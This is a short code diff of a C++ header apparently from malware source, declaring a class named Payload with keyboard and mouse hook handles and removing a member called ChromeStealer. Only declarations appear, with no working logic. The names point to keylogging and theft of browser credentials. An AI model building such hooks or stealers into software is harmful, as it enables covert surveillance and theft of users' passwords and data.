@@ -17,7 +17,6 @@ public:
 	static HINSTANCE Instance;
 	static HHOOK KeyboardHook;
 	static HHOOK MouseHook;
-	static ChromeStealer Stealer;
 public:
 	Payload(void);
 	virtual ~Payload(void);
